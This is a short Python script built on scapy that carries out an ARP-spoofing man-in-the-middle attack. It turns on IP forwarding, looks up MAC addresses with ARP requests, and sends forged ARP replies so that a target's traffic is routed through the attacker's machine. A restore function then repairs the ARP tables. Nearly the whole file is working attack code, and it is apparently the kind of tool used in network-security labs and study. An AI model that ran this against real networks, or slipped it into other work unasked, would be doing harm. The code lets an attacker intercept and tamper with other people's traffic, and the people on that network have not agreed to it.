from scapy.all import *
from scapy.layers.l2 import ARP, Ether, arping


def ip_route(enable_status: str):
    """
        Enables or disables IP routing based on the input status
        :param enable_status: 1- enable, 0- disable
    """
    print("Enable IP Routing")
    path = "/proc/sys/net/ipv4/ip_forward"
    with open(path, "w") as f:
        f.write(enable_status)


def get_mac_address(ip_address: str):
    """
    Returns the MAC address of the device with the given IP address
    """
    try:
        answered_packets, unanswered_packets = srp(
            Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip_address), timeout=3)
    except Exception as e:
        print(f"An error occurred while trying to send the ARP request: {e}")
        return None

    if answered_packets:
        return answered_packets[0][1].src

    print(f"No device with the IP address {ip_address} was found")
    return None


def arp_poisoning(target_mac, target_ip, host_ip):
    """
    Performs ARP poisoning between the target and the host
    """
    print("target_ip: ", target_ip, " host_ip:", host_ip)
    print("target_mac: ", target_mac)
    response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    send(response)


def restore(target_mac, host_mac, target_ip, host_ip):
    """
    Restores the network by re-ARPing the target and the host
    """
    response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    send(response, count=7)
